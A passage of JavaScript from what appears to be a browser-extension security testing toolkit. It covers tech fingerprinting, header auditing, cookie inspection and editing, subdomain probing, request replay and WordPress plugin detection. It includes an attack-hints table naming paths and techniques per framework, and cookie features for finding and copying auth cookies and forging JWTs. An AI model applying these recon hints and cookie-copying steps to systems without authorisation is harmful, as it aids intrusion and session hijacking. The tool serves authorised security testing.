        { re: /vue[.\-\s]?v?(\d+\.\d+\.\d+)/i, name: 'Vue.js' },
        { re: /lodash[.\-\s]?v?(\d+\.\d+\.\d+)/i, name: 'Lodash' },
        { re: /moment[.\-\s]?v?(\d+\.\d+\.\d+)/i, name: 'Moment.js' },
        { re: /axios[.\-\s]?v?(\d+\.\d+\.\d+)/i, name: 'Axios' },
      ];
      // Check external JS filenames for version hints
      sr.data.external.slice(0, 15).forEach(url => {
        const filename = url.split('/').pop()?.split('?')[0] || '';
        versionPatterns.forEach(({ re, name }) => {
          const m = filename.match(re);
          if (m) {
            const existing = all.find(t => t.name.toLowerCase().includes(name.toLowerCase()));
            if (existing) existing.name = name + ' v' + m[1];
            else all.push({ name: name + ' v' + m[1], category: 'Library', confidence: 'high' });
          }
        });
      });
      // Scan first few JS file headers for version comments
      for (const url of sr.data.external.slice(0, 5)) {
        try {
          const r = await chrome.runtime.sendMessage({ type: 'FETCH_JS', url });
          if (r.ok) {
            const header = r.text.slice(0, 300);
            versionPatterns.forEach(({ re, name }) => {
              const m = header.match(re);
              if (m && !all.some(t => t.name.includes(name + ' v'))) {
                const existing = all.find(t => t.name.toLowerCase().includes(name.toLowerCase()));
                if (existing) existing.name = name + ' v' + m[1];
                else all.push({ name: name + ' v' + m[1], category: 'Library', confidence: 'high' });
              }
            });
          }
        } catch {}
      }
    }
  } catch {}

  // 4. Framework globals from main world (React, Next.js, Vue, etc. with versions)
  try {
    const globalsRes = await msgTab({ type: 'DETECT_GLOBALS' });
    if (globalsRes?.ok && globalsRes.data) {
      globalsRes.data.forEach(g => {
        const existing = all.find(t => t.name.toLowerCase().includes(g.name.toLowerCase()));
        if (existing) {
          if (g.detail && !existing.name.includes(g.detail)) existing.name += ' (' + g.detail + ')';
          existing.confidence = 'high';
        } else {
          all.push({ name: g.name + (g.detail ? ' (' + g.detail + ')' : ''), category: 'Framework', confidence: 'high' });
        }
      });
    }
  } catch {}

  // Deduplicate by name similarity
  const deduped = [];
  all.forEach(t => {
    const existing = deduped.find(d => d.name.toLowerCase() === t.name.toLowerCase());
    if (!existing) deduped.push(t);
    else if (t.confidence === 'high' && existing.confidence !== 'high') Object.assign(existing, t);
  });

  const attackHints = {
    'WordPress': 'Try: /wp-json/wp/v2/users, xmlrpc.php brute force, plugin vulns',
    'Next.js': 'Try: /_next/data paths, API routes, SSRF via image optimization',
    'React': 'Check: source maps (.js.map), Redux devtools, client-side auth checks',
    'Laravel': 'Try: /.env, /telescope, /horizon, debug mode, mass assignment',
    'Django': 'Try: /admin/, debug toolbar, CSRF token reuse, ORM injection',
    'Express': 'Check: prototype pollution, path traversal, debug routes',
    'Angular': 'Check: template injection, source maps, client-side routing auth',
    'Vue.js': 'Check: source maps, Vuex state exposure, client-side auth',
    'Shopify': 'Check: GraphQL API, liquid template injection, admin paths',
    'Cloudflare': 'Note: WAF in place — may need bypass techniques for payloads',
    'Nginx': 'Try: path traversal via aliases, off-by-slash misconfiguration',
    'Apache': 'Try: /server-status, /server-info, .htaccess bypass',
    'PHP': 'Try: phpinfo.php, type juggling, deserialization, file inclusion',
    'ASP.NET': 'Try: /trace.axd, /elmah.axd, viewstate deserialization',
    'jQuery': 'Check version for known XSS (pre-3.5.0 CVEs)',
    'Bootstrap': 'Low priority — mostly CSS, check for XSS in tooltips/popovers',
    'Drupal': 'Try: /user/login, /admin, /node/1, /CHANGELOG.txt for version',
    'Ruby on Rails': 'Try: /rails/info, debug mode, mass assignment, CSRF bypass',
    'Java': 'Try: /actuator, /console, deserialization, JNDI injection',
    'Tomcat': 'Try: /manager/html, /host-manager, /status, default creds',
  };

  const confIcon = { high: '', medium: '~', low: '?' };
  b.innerHTML = `<div class="text-xs text-muted mb-4">URL: ${esc(activeTabUrl)}</div>` +
    (deduped.length === 0 ? '<div class="text-muted text-sm">No tech detected</div>' : deduped.map(t => {
      const hint = Object.entries(attackHints).find(([k]) => t.name.toLowerCase().includes(k.toLowerCase()));
      return `<div class="result-item ${hint ? 'medium' : 'info'}" style="cursor:pointer">
        <div class="result-label">${esc(t.category)} <span class="text-xs text-muted">${confIcon[t.confidence] || ''}${esc(t.confidence)}</span></div>
        <div class="result-value" style="font-weight:600">${esc(t.name)}</div>
        ${hint ? `<div class="text-xs" style="color:var(--warning);margin-top:2px">${hint[1]}</div>` : ''}
      </div>`;
    }).join(''));
  finalizeResults('recon');
}

async function toolHeadersAudit() {
  const b = showResults('recon', 'Headers Audit', true);
  const hRes = await chrome.runtime.sendMessage({ type: 'GET_HEADERS', tabId: activeTabId });
  if (!hRes.headers) { b.innerHTML = errMsg('No headers. Reload page first.'); return; }
  const hd = {}; hRes.headers.responseHeaders.forEach(h => { hd[h.name.toLowerCase()] = h.value; });

  // Deep header value analysis
  const findings = [];
  let score = 0;

  // CSP analysis
  const csp = hd['content-security-policy'];
  if (csp) {
    score += 10;
    if (csp.includes("'unsafe-inline'")) { findings.push({ sev: 'high', text: "CSP allows 'unsafe-inline' — XSS protection bypassed" }); score -= 5; }
    else if (csp.includes("'unsafe-eval'")) { findings.push({ sev: 'high', text: "CSP allows 'unsafe-eval' — code injection possible" }); score -= 5; }
    else if (csp.includes('*')) { findings.push({ sev: 'medium', text: "CSP contains wildcard (*) — overly permissive" }); score -= 3; }
    else score += 5;
    if (/cdn\.jsdelivr|cdnjs\.cloudflare|unpkg\.com/.test(csp)) findings.push({ sev: 'medium', text: 'CSP trusts CDNs (jsdelivr/cdnjs/unpkg) — known bypass vectors' });
  } else { findings.push({ sev: 'high', text: 'No Content-Security-Policy — no XSS protection' }); }

  // HSTS analysis
  const hsts = hd['strict-transport-security'];
  if (hsts) {
    score += 10;
    const maxAge = hsts.match(/max-age=(\d+)/);
    if (maxAge && parseInt(maxAge[1]) < 31536000) findings.push({ sev: 'medium', text: `HSTS max-age=${maxAge[1]} (< 1 year) — too short` });
    if (maxAge && parseInt(maxAge[1]) === 0) { findings.push({ sev: 'high', text: 'HSTS max-age=0 — HSTS disabled!' }); score -= 10; }
    if (!hsts.includes('includeSubDomains')) findings.push({ sev: 'low', text: 'HSTS missing includeSubDomains' });
    else score += 5;
  } else { findings.push({ sev: 'high', text: 'No HSTS — MITM downgrade possible' }); }

  // X-Frame-Options — validate value
  const xfo = hd['x-frame-options'];
  if (xfo) {
    const val = xfo.toLowerCase();
    if (val === 'deny' || val === 'sameorigin') { score += 10; }
    else if (val === 'allowall' || val === 'allow-from') { findings.push({ sev: 'medium', text: `X-Frame-Options: ${xfo} — weak or deprecated value` }); score += 3; }
    else { findings.push({ sev: 'low', text: `X-Frame-Options: ${xfo} — non-standard value` }); score += 5; }
  } else {
    const cspFrame = csp && (csp.includes('frame-ancestors') || csp.includes("frame-src 'none'"));
    if (!cspFrame) findings.push({ sev: 'medium', text: 'No X-Frame-Options or frame-ancestors — clickjacking possible' });
    else score += 10;
  }

  // Other headers
  if (hd['x-content-type-options']) score += 10; else findings.push({ sev: 'low', text: 'No X-Content-Type-Options' });
  if (hd['referrer-policy']) score += 10; else findings.push({ sev: 'low', text: 'No Referrer-Policy — URLs may leak via Referer header' });
  if (hd['permissions-policy']) score += 10; else findings.push({ sev: 'low', text: 'No Permissions-Policy' });
  if (hd['cross-origin-opener-policy']) score += 10;
  if (hd['cross-origin-resource-policy']) score += 10;

  // CORS headers inline
  const acao = hd['access-control-allow-origin'];
  if (acao === '*') findings.push({ sev: 'medium', text: 'CORS: Access-Control-Allow-Origin: * (wildcard)' });
  if (hd['access-control-allow-credentials'] === 'true' && acao && acao !== '*') findings.push({ sev: 'high', text: `CORS: Credentials allowed with origin ${acao} — test for reflection` });

  // WAF detection
  const wafSigs = [];
  if (hd['cf-ray'] || hd['cf-cache-status'] || hd['server']?.includes('cloudflare')) wafSigs.push('Cloudflare');
  if (hd['x-akamai-transformed'] || hd['akamai-grn'] || hd['server']?.includes('AkamaiGHost')) wafSigs.push('Akamai');
  if (hd['x-amz-cf-id'] || hd['x-amz-request-id']) wafSigs.push('AWS CloudFront');
  if (hd['x-sucuri-id'] || hd['x-sucuri-cache']) wafSigs.push('Sucuri');
  if (hd['server']?.includes('Imperva') || hd['x-iinfo']) wafSigs.push('Imperva');

  // Info disclosure
  const leaked = [];
  ['server','x-powered-by','x-aspnet-version','x-runtime','x-generator','x-debug-token'].forEach(k => { if (hd[k]) leaked.push(k + ': ' + hd[k]); });

  const grade = score >= 70 ? 'A' : score >= 50 ? 'B' : score >= 30 ? 'C' : score >= 15 ? 'D' : 'F';
  b.innerHTML = `<div class="text-xs text-muted mb-4">URL: ${esc(activeTabUrl)}</div>
    <div style="display:flex;align-items:center;margin-bottom:8px"><span class="header-grade grade-${grade.toLowerCase()}">${grade}</span><span class="text-sm">Score: ${score}/100</span></div>
    ${wafSigs.length ? `<div class="result-item info"><div class="result-label">🛡 WAF Detected</div><div class="result-value">${wafSigs.join(', ')} — payloads may need bypass techniques</div></div>` : ''}
    ${findings.map(f => `<div class="result-item ${f.sev}"><div class="result-label"><span class="result-tag tag-${f.sev}">${f.sev}</span></div><div class="result-value">${esc(f.text)}</div></div>`).join('')}
    ${leaked.length ? `<div class="result-item medium mt-4"><div class="result-label">🔓 Info Disclosure</div><div class="result-value">${leaked.map(esc).join('<br>')}</div></div>` : ''}`;
  finalizeResults('recon');
}

async function toolCookies() {
  const b = showResults('clientdata', 'Cookies', true);
  const res = await chrome.runtime.sendMessage({ type: 'GET_COOKIES', domain: activeTabDomain });
  if (!res.ok||!res.cookies.length) { b.innerHTML = '<div class="text-muted text-sm">No cookies</div>'; finalizeResults('clientdata'); return; }
  const cookies = res.cookies;
  // Fingerprint session technology
  const techMap = { 'PHPSESSID': 'PHP', 'JSESSIONID': 'Java', 'connect.sid': 'Express/Node.js', '_session_id': 'Rails', '_app_session': 'Rails', 'csrftoken': 'Django', '.AspNetCore': '.NET Core', 'ASP.NET_SessionId': 'ASP.NET', 'CFID': 'ColdFusion', 'CFTOKEN': 'ColdFusion', 'laravel_session': 'Laravel', 'wp-settings': 'WordPress', '__cfduid': 'Cloudflare', '_ak_': 'Akamai', 'ak_bmsc': 'Akamai' };
  const authPatterns = /^(session|sess|sid|ssid|token|auth|jwt|access|connect\.sid|PHPSESSID|JSESSIONID|_session|ASP\.NET_SessionId|laravel_session|__Host-|__Secure-|_identity|remember|login|user_session|_csrf|csrftoken)/i;
  const detectedTech = []; const securityIssues = []; const jwtCookies = [];
  let authCookie = null;
  cookies.forEach(c => {
    for (const [pattern, tech] of Object.entries(techMap)) {
      if (c.name.includes(pattern) || c.name.startsWith(pattern)) { if (!detectedTech.includes(tech)) detectedTech.push(tech); }
    }
    if (/^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/.test(c.value)) jwtCookies.push(c.name);
    if (!c.httpOnly && !TRACKING_COOKIES.test(c.name)) securityIssues.push(`${c.name}: missing HttpOnly`);
    if (!c.secure) securityIssues.push(`${c.name}: missing Secure`);
    if ((c.sameSite === 'unspecified' || c.sameSite === 'none') && !TRACKING_COOKIES.test(c.name)) securityIssues.push(`${c.name}: SameSite=${c.sameSite || 'unspecified'}`);
    if (c.expirationDate) {
      const daysUntilExpiry = Math.floor((c.expirationDate * 1000 - Date.now()) / 86400000);
      if (daysUntilExpiry > 365) securityIssues.push(`${c.name}: expires in ${daysUntilExpiry} days (excessive)`);
    }
    // Identify likely auth cookie (prioritize by: HttpOnly + long value + name pattern)
    if (authPatterns.test(c.name) && c.value.length > 10) {
      if (!authCookie || (c.httpOnly && !authCookie.httpOnly) || c.value.length > authCookie.value.length)
        authCookie = c;
    }
  });

  let infoHtml = '';
  // Auth status banner with test button
  infoHtml += `<div class="result-item info" id="auth-banner"><div class="result-label">🔐 Auth Status</div><div class="result-value" id="auth-status">${authCookie ? `Likely session cookie: <strong>${esc(authCookie.name)}</strong>` : 'No session cookie pattern detected'} <button class="btn-sm primary" id="btn-test-auth" style="padding:1px 6px;font-size:9px;margin-left:4px">Test Auth</button></div></div>`;
  if (detectedTech.length) infoHtml += `<div class="result-item info"><div class="result-label">🔍 Session Technology</div><div class="result-value">${detectedTech.join(', ')}</div></div>`;
  if (jwtCookies.length) infoHtml += `<div class="result-item medium"><div class="result-label">🎟 JWT in Cookies</div><div class="result-value">${jwtCookies.join(', ')} — try JWT Editor to decode & forge</div></div>`;
  if (securityIssues.length) infoHtml += `<div class="result-item ${securityIssues.length > 3 ? 'high' : 'medium'}"><div class="result-label">⚠ Security Issues (${securityIssues.length})</div><div class="result-value" style="font-size:9.5px">${securityIssues.slice(0,8).join('<br>')}</div></div>`;

  b.innerHTML = `${infoHtml}<div class="flex-between mb-6 mt-6"><span class="text-sm">${cookies.length} cookies</span></div>
    <div style="overflow-x:auto"><table class="cookie-table">
    <tr><th>Name</th><th>Value</th><th></th></tr>
    ${cookies.map((c, i) => {
      const isAuth = authCookie && c.name === authCookie.name;
      return `<tr data-ci="${i}" style="cursor:pointer${isAuth ? ';background:var(--accent-soft)' : ''}">
      <td title="${esc(c.name)}" style="font-weight:600;color:var(--text)">${isAuth ? '🔐 ' : ''}${esc(c.name)}</td>
      <td title="${esc(c.value)}" style="max-width:140px">${esc(c.value.slice(0, 45))}${c.value.length > 45 ? '…' : ''}</td>
      <td style="white-space:nowrap">
        <button class="btn-sm cookie-cp" data-ci="${i}" style="padding:2px 5px;font-size:9px">Copy</button>
        <button class="btn-sm cookie-del" data-ci="${i}" style="padding:2px 5px;font-size:9px;color:var(--danger)">Del</button>
      </td>
    </tr>`;
    }).join('')}
    </table></div>
    <div id="ck-detail" style="display:none;margin-top:8px;padding:8px;background:var(--surface-hover);border:1px solid var(--border);border-radius:var(--radius)">
      <div class="flex-between mb-4"><span class="text-sm" style="font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:70%" id="ck-det-name"></span><button class="btn-sm" id="ck-det-copy" style="padding:1px 6px;font-size:9px;flex-shrink:0">Copy Value</button></div>
      <textarea class="tool-input" id="ck-det-val" rows="3" readonly style="font-size:9.5px;word-break:break-all;resize:vertical"></textarea>
      <div class="text-xs text-muted mt-4" id="ck-det-flags"></div>
    </div>
    <div class="result-label mt-6 mb-4">Edit / Add Cookie</div>
    <div class="tool-input-row"><input class="tool-input" id="ck-name" placeholder="Cookie name" style="width:40%"><input class="tool-input" id="ck-val" placeholder="Cookie value"></div>
    <div class="tool-input-row" style="flex-wrap:wrap">
      <button class="btn-sm primary" id="ck-set">Set Cookie</button>
      <button class="btn-sm" id="ck-header">Copy as Header</button>
      <button class="btn-sm" id="ck-json">Copy JSON</button>
      <button class="btn-sm" id="ck-all">Copy name=val</button>
    </div>`;

  // Test auth button — tests each cookie individually
  b.querySelector('#btn-test-auth')?.addEventListener('click', async () => {
    if (!confirm('This test temporarily removes cookies one by one to identify which are needed for authentication.\n\nYour session should be restored after the test, but in rare cases the server may invalidate the session.\n\nProceed?')) return;
    const btn = b.querySelector('#btn-test-auth');
    btn.textContent = `Testing ${cookies.length} cookies…`; btn.disabled = true;
    const r = await chrome.runtime.sendMessage({ type: 'TEST_AUTH', url: activeTabUrl, domain: activeTabDomain });
    const banner = b.querySelector('#auth-banner');
    if (!r.ok) { btn.textContent = 'Failed'; btn.disabled = false; return; }
    const authCookies = (r.results || []).filter(x => x.significant);
    const notNeeded = (r.results || []).filter(x => !x.significant && x.role !== 'unknown');

    if (r.siteUsesAuth && authCookies.length) {
      banner.className = 'result-item high';
      banner.querySelector('.result-value').innerHTML = `<strong>Authenticated session</strong> (${r.baseStatus}/${r.baseLen}b with cookies, ${r.noStatus}/${r.noLen}b without)<br>` +
        `<span style="color:var(--accent);font-weight:600">${authCookies.length} required for auth:</span> ` +
        authCookies.map(c => `<code style="background:var(--accent-soft);padding:1px 4px;border-radius:2px;font-size:9px">${esc(c.name)}</code>`).join(' ') +
        `<br><button class="btn-sm primary" id="btn-copy-auth" style="padding:2px 8px;font-size:9px;margin-top:4px">Copy Auth Cookies</button>` +
        (notNeeded.length ? `<br><span class="text-xs text-muted">${notNeeded.length} cookies not needed for auth</span>` : '');
      // Highlight auth rows in table
      b.querySelectorAll('tr').forEach(tr => {
        const name = tr.querySelector('td')?.textContent?.replace('🔐 ', '');
        if (authCookies.some(c => c.name === name)) tr.style.background = 'var(--accent-soft)';
        else if (notNeeded.some(c => c.name === name)) tr.style.opacity = '0.5';
      });
      b.querySelector('#btn-copy-auth')?.addEventListener('click', () => {
        const authOnly = cookies.filter(c => authCookies.some(a => a.name === c.name));
        copyText(authOnly.map(c => c.name + '=' + c.value).join('; '));
      });
    } else if (r.siteUsesAuth) {
      banner.className = 'result-item medium';
      banner.querySelector('.result-value').innerHTML = `<strong>Auth detected but no single cookie is responsible</strong> (may need a combination)`;
    } else {
      banner.className = 'result-item info';
      banner.querySelector('.result-value').innerHTML = `<strong>No cookie-based auth detected</strong> — page responds identically with and without cookies (SPA may use JS-based auth via localStorage)`;
    }
  });
  // Per-cookie copy
  b.querySelectorAll('.cookie-cp').forEach(btn => btn.addEventListener('click', (e) => { e.stopPropagation(); const c = cookies[+btn.dataset.ci]; copyText(c.name + '=' + c.value); }));
  // Click row to show detail
  b.querySelectorAll('tr[data-ci]').forEach(tr => tr.addEventListener('click', () => {
    const c = cookies[+tr.dataset.ci];
    const det = b.querySelector('#ck-detail');
    det.style.display = 'block';
    b.querySelector('#ck-det-name').textContent = c.name;
    b.querySelector('#ck-det-val').value = c.value;
    const flags = [];
    flags.push(`Domain: ${c.domain}`);
    flags.push(`Path: ${c.path}`);
    flags.push(`HttpOnly: ${c.httpOnly ? '✓' : '✗'}`);
    flags.push(`Secure: ${c.secure ? '✓' : '✗'}`);
    flags.push(`SameSite: ${c.sameSite || 'unspecified'}`);
    if (c.expirationDate) {
      const exp = new Date(c.expirationDate * 1000);
      const days = Math.floor((c.expirationDate * 1000 - Date.now()) / 86400000);
      flags.push(`Expires: ${exp.toLocaleDateString()} (${days}d)`);
    } else { flags.push('Session cookie (no expiry)'); }
    b.querySelector('#ck-det-flags').textContent = flags.join(' · ');
    // Pre-fill edit fields
    b.querySelector('#ck-name').value = c.name;
    b.querySelector('#ck-val').value = c.value;
  }));
  b.querySelector('#ck-det-copy')?.addEventListener('click', () => {
    copyText(b.querySelector('#ck-det-val').value);
  });
  // Per-cookie delete
  b.querySelectorAll('.cookie-del').forEach(btn => btn.addEventListener('click', async () => {
    const c = cookies[+btn.dataset.ci];
    const url = (c.secure ? 'https://' : 'http://') + c.domain.replace(/^\./, '') + c.path;
    await chrome.runtime.sendMessage({ type: 'DELETE_COOKIE', url, name: c.name });
    log('Deleted cookie: ' + c.name, 'success');
    toolCookies(); // Refresh
  }));
  // Set/edit cookie
  b.querySelector('#ck-set')?.addEventListener('click', async () => {
    const name = b.querySelector('#ck-name').value.trim();
    const value = b.querySelector('#ck-val').value;
    if (!name) return;
    try {
      await chrome.cookies.set({ url: activeTabUrl, name, value, domain: activeTabDomain, path: '/' });
      log('Set cookie: ' + name, 'success');
      toolCookies(); // Refresh
    } catch (e) { log('Set cookie failed: ' + e.message, 'error'); }
  });
  b.querySelector('#ck-header')?.addEventListener('click', () => copyText('Cookie: ' + cookies.map(c => c.name + '=' + c.value).join('; ')));
  b.querySelector('#ck-json')?.addEventListener('click', () => copyText(JSON.stringify(cookies.map(c => ({ name: c.name, value: c.value, domain: c.domain, path: c.path, httpOnly: c.httpOnly, secure: c.secure, sameSite: c.sameSite })), null, 2)));
  b.querySelector('#ck-all')?.addEventListener('click', () => copyText(cookies.map(c => c.name + '=' + c.value).join('\n')));
  finalizeResults('clientdata');
}

async function toolSubdomains() {
  const b = showResults('recon', 'Subdomains', true);
  b.innerHTML = '<div class="loading-text"><span class="spinner"></span> Enumerating subdomains…</div>';
  const root = getRootDomain(activeTabDomain);
  const res = await chrome.runtime.sendMessage({ type: 'ENUM_SUBDOMAINS', domain: root });
  if (!res.ok) { b.innerHTML = errMsg(res.error); return; }
  const subs = res.subdomains.filter(s => !s.startsWith('*'));
  if (!subs.length) { b.innerHTML = '<div class="text-muted text-sm">No subdomains found</div>'; finalizeResults('recon'); return; }

  // Show list first, then probe
  b.innerHTML = `<div class="flex-between mb-6"><span class="text-sm">${subs.length} subdomains (${res.source || 'crt.sh'})</span><button class="btn-sm primary" id="sd-probe">Probe All</button></div><div id="sd-list">${subs.map(s => `<div class="result-item info"><div class="result-value">${esc(s)}</div></div>`).join('')}</div>`;
  finalizeResults('recon');

  b.querySelector('#sd-probe')?.addEventListener('click', async () => {
    const btn = b.querySelector('#sd-probe');
    btn.disabled = true; btn.textContent = 'Probing…';
    const probeRes = await chrome.runtime.sendMessage({ type: 'PROBE_SUBDOMAINS', subdomains: subs });
    if (!probeRes.ok) { btn.textContent = 'Probe Failed'; return; }

    const alive = probeRes.results.filter(r => r.status !== 'dead');
    const dead = probeRes.results.filter(r => r.status === 'dead');

    b.querySelector('#sd-list').innerHTML =
      `<div class="text-xs text-muted mb-6">${alive.length} alive, ${dead.length} dead/timeout</div>` +
      probeRes.results.sort((a, c) => {
        if (a.status === 'dead' && c.status !== 'dead') return 1;
        if (a.status !== 'dead' && c.status === 'dead') return -1;
        return 0;
      }).map(r => {
        const isDead = r.status === 'dead';
        const is200 = r.status === 200;
        const is403 = r.status === 403 || r.status === 401;
        const is3xx = r.status >= 300 && r.status < 400;
        const sev = isDead ? 'info' : is200 ? 'high' : is403 ? 'medium' : is3xx ? 'low' : 'info';
        const tagClass = isDead ? 'tag-info' : is200 ? 'tag-safe' : is403 ? 'tag-medium' : is3xx ? 'tag-low' : 'tag-info';
        const statusText = isDead ? 'DEAD' : r.status;
        return `<div class="result-item ${sev}">
          <div class="result-label"><span class="result-tag ${tagClass}">${statusText}</span>${r.http ? ' <span class="text-xs text-muted">HTTP</span>' : ''} ${esc(r.sub)}</div>
          ${r.title ? `<div class="result-value">${esc(r.title)}</div>` : ''}
          ${r.url && r.url !== 'https://' + r.sub + '/' ? `<div class="text-xs text-muted">→ ${esc(r.url)}</div>` : ''}
        </div>`;
      }).join('');
    btn.textContent = 'Probed';
    finalizeResults('recon');
    log(`Subdomains: ${alive.length} alive, ${dead.length} dead`, 'success');
  });
}

async function toolReqResp() {
  const b = showResults('utility', 'Req / Resp', true);
  const hRes = await chrome.runtime.sendMessage({ type: 'GET_HEADERS', tabId: activeTabId });
  const cookieRes = await chrome.runtime.sendMessage({ type: 'GET_COOKIES', domain: activeTabDomain });
  const h = hRes.headers;
  const cookies = cookieRes.ok ? cookieRes.cookies : [];
  const cookieStr = cookies.map(c => c.name + '=' + c.value).join('; ');

  // Build request string — combine captured headers + cookies
  const u = new URL(activeTabUrl);
  let reqStr = `GET ${u.pathname}${u.search} HTTP/1.1\r\nHost: ${u.hostname}\r\n`;
  if (h && h.requestHeaders && h.requestHeaders.length) {
    // Use captured headers (includes Referer, User-Agent, Accept, etc.)
    h.requestHeaders.forEach(rh => { reqStr += `${rh.name}: ${rh.value}\r\n`; });
    // If Cookie wasn't captured, add it from cookies API
    if (!h.requestHeaders.some(rh => rh.name.toLowerCase() === 'cookie') && cookieStr) {
      reqStr += `Cookie: ${cookieStr}\r\n`;
    }
  } else {
    // No captured headers — build synthetic from what we know
    reqStr += `User-Agent: Mozilla/5.0\r\n`;
    reqStr += `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n`;
    reqStr += `Referer: ${u.origin}/\r\n`;
    if (cookieStr) reqStr += `Cookie: ${cookieStr}\r\n`;
  }
  reqStr += '\r\n';

  // Build response string
  let resStr = '';
  if (h) {
    resStr = `HTTP/1.1 ${h.statusCode}\r\n`;
    h.responseHeaders.forEach(rh => { resStr += `${rh.name}: ${rh.value}\r\n`; });
  }

  const stale = h && h.url !== activeTabUrl;
  b.innerHTML =
    (stale ? `<div class="result-item medium mb-4"><div class="result-value">⚠ Headers from ${esc(new URL(h.url).pathname)} — current: ${esc(u.pathname)}</div></div>` : '') +
    `<div class="result-label mb-4">Request (${cookies.length} cookies attached)</div>
    <pre class="result-value" style="max-height:180px;overflow:auto;white-space:pre-wrap;margin-bottom:8px">${esc(reqStr)}</pre>
    <div class="result-label mb-4">Response Headers</div>
    <pre class="result-value" style="max-height:160px;overflow:auto;white-space:pre-wrap">${esc(resStr || '(reload page to capture)')}</pre>
    <div class="tool-input-row mt-6">
      <button class="btn-sm primary" id="rr-req">Copy Req</button>
      <button class="btn-sm primary" id="rr-res">Copy Resp</button>
      <button class="btn-sm" id="rr-both">Copy Both</button>
    </div>
    <div class="result-label mt-8 mb-4">Re-fetch with Editor</div>
    <div class="tool-input-row">
      <select class="tool-select" id="rr-method" style="width:80px"><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>OPTIONS</option><option>HEAD</option></select>
    </div>
    <input class="tool-input mb-4" id="rr-url" value="${esc(activeTabUrl)}">
    <textarea class="tool-input mb-4" id="rr-edit-headers" rows="4" style="font-size:10px" placeholder="Edit headers…">${esc(JSON.stringify({ 'User-Agent': 'Mozilla/5.0', 'Cookie': cookieStr || '', 'Accept': '*/*' }, null, 2))}</textarea>
    <textarea class="tool-input mb-4" id="rr-edit-body" rows="2" placeholder="Request body (POST/PUT)"></textarea>
    <div class="tool-input-row">
      <button class="btn-sm primary" id="rr-send">Send Request</button>
      <button class="btn-sm" id="rr-curl">Copy as cURL</button>
    </div>
    <pre class="result-value mt-6" id="rr-response" style="max-height:200px;overflow:auto;white-space:pre-wrap;font-size:10px"></pre>`;

  b.querySelector('#rr-req')?.addEventListener('click', () => copyText(reqStr));
  b.querySelector('#rr-res')?.addEventListener('click', () => copyText(resStr));
  b.querySelector('#rr-both')?.addEventListener('click', () => copyText('=== REQUEST ===\n' + reqStr + '\n=== RESPONSE ===\n' + resStr));

  b.querySelector('#rr-send')?.addEventListener('click', async () => {
    const url = b.querySelector('#rr-url').value;
    const method = b.querySelector('#rr-method').value;
    let headers = {}; try { headers = JSON.parse(b.querySelector('#rr-edit-headers').value); } catch {}
    const body = b.querySelector('#rr-edit-body').value || undefined;
    const out = b.querySelector('#rr-response');
    out.textContent = 'Sending…';
    const r = await chrome.runtime.sendMessage({ type: 'REPLAY_REQUEST', url, method, headers, body });
    if (r.ok) {
      let respText = `HTTP/1.1 ${r.status} ${r.statusText}\r\n`;
      Object.entries(r.headers).forEach(([k,v]) => { respText += `${k}: ${v}\r\n`; });
      respText += `\r\n${r.text}`;
      out.textContent = respText;
    } else {
      out.textContent = 'Error: ' + r.error;
    }
  });

  b.querySelector('#rr-curl')?.addEventListener('click', () => {
    const m = b.querySelector('#rr-method').value;
    const url = b.querySelector('#rr-url').value;
    let headers = {}; try { headers = JSON.parse(b.querySelector('#rr-edit-headers').value); } catch {}
    const body = b.querySelector('#rr-edit-body').value;
    let curl = `curl -X ${m}`;
    Object.entries(headers).forEach(([k,v]) => { if (v) curl += ` -H '${k}: ${v}'`; });
    if (body) curl += ` -d '${body}'`;
    curl += ` '${url}'`;
    copyText(curl);
  });

  finalizeResults('utility');
}

async function toolDns() {
  const b = showResults('recon', 'DNS Lookup', true);
  b.innerHTML = '<div class="loading-text"><span class="spinner"></span> Resolving DNS + SPF/DMARC…</div>';
  const res = await chrome.runtime.sendMessage({ type: 'DNS_LOOKUP', domain: activeTabDomain });
  if (!res.ok) { b.innerHTML = errMsg(res.error); return; }
  let html = Object.entries(res.records).map(([t,r]) => `<div class="result-item info" style="cursor:pointer"><div class="result-label">${t}</div><div class="result-value">${r.map(esc).join('<br>')}</div></div>`).join('') || '';
  // Email security
  if (res.emailSecurity) {
    const es = res.emailSecurity;
    html += `<div class="result-label mt-6 mb-4">📧 Email Security (SPF/DMARC)</div>`;
    if (es.spf) html += `<div class="result-item info"><div class="result-label">SPF</div><div class="result-value" style="font-size:9px;word-break:break-all">${esc(es.spf)}</div></div>`;
    if (es.dmarc) html += `<div class="result-item info"><div class="result-label">DMARC</div><div class="result-value" style="font-size:9px;word-break:break-all">${esc(es.dmarc)}</div></div>`;
    es.findings.forEach(f => {
      html += `<div class="result-item ${f.severity}"><div class="result-label"><span class="result-tag tag-${f.severity}">${f.severity}</span></div><div class="result-value">${esc(f.text)}</div></div>`;
    });
  }
  b.innerHTML = html || '<div class="text-muted text-sm">No records</div>';
  finalizeResults('recon');
}

async function toolWpPlugins() {
  const b = showResults('recon', 'WP Plugins', true);
  b.innerHTML = '<div class="loading-text"><span class="spinner"></span> Scanning for WordPress…</div>';
  const res = await chrome.runtime.sendMessage({ type: 'DETECT_WP_PLUGINS', url: activeTabUrl });
  if (!res.ok) { b.innerHTML = errMsg(res.error); return; }
  if (!res.plugins.length && !res.themes.length && !res.wpVersion) {
    b.innerHTML = '<div class="text-muted text-sm">No WordPress detected on this page</div>';
    finalizeResults('recon'); return;
  }
  let html = '';
  if (res.wpVersion) html += `<div class="result-item info"><div class="result-label">WordPress Version</div><div class="result-value">${esc(res.wpVersion)}</div></div>`;
  if (res.themes.length) {
    html += `<div class="result-label mt-6 mb-4">Themes (${res.themes.length})</div>`;
    html += res.themes.map(t => `<div class="result-item info"><div class="result-value">${esc(t)}</div></div>`).join('');
  }
  if (res.plugins.length) {
    html += `<div class="result-label mt-6 mb-4">Plugins (${res.plugins.length})</div>`;
    html += res.plugins.map(p => `<div class="result-item ${p.version?'medium':'info'}"><div class="result-value">${esc(p.name)}${p.version?' <span class="result-tag tag-medium">v'+esc(p.version)+'</span>':''}</div></div>`).join('');
  }
  b.innerHTML = html;
  finalizeResults('recon');
}

async function toolSecrets() {
  const b = showResults('discovery', 'Secrets', true);
  b.innerHTML = '<div class="loading-text"><span class="spinner"></span> Scanning JS…</div>';
  const sr = await msgTab({ type: 'GET_SCRIPT_URLS' });
